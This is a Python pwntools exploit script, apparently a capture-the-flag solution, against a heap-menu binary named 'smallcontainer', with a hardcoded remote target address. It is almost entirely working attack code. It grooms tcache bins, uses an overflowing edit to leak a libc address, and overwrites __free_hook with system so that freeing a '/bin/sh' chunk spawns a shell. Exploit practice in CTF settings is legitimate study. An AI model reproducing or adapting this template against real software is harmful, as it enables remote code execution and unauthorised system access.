# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './smallcontainer'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
else:
    host = '123.56.45.214'
    port = '32967'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a = 6      : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a = 4      : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla('>',num)

def add(size):
    cmd(1)
    sla('size:' , size)

def edit(idx , text):
    cmd(3)
    sla('index:' , idx)
    se(text)

def show(idx ):
    cmd(4)
    sla(' index:' , idx)

def delete(idx ):
    cmd(2)
    sla('index:' , idx)

def attack():
    
    for i in range(13):
        add(0x208)

    for i in range(7):
        delete(6+i)
    
    delete(0)
    delete(1)
    delete(2)

    add(0x318) #0
    edit(0 , 'a'*0x318)

    add(0x1e8) #1
    show(1)
    p.recv()

    __malloc_hook = rint(len('7fded4a5cca0')) - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    add(0x108) #2

    for i in range(7):
        add(0x1e8)
    for i in range(7):
        delete(6+i)

    for i in range(7):
        add(0x308)
    for i in range(7):
        delete(6+i)

    delete(1)
    delete(3)
    delete(2)

    add(0x2e8) 
    edit(1 , flat(__free_hook-8 , 0)*0x2e)
    add(0x108)

    add(0x108) #3
    edit(3 , flat('/bin/sh\x00' ,system_addr ))

    delete(3)
    # dbg()

    p.interactive()

attack()

'''
@File    :   smallcontainer.py
@Time    :   2022/08/17 13:54:19
@Author  :   Niyah 
'''
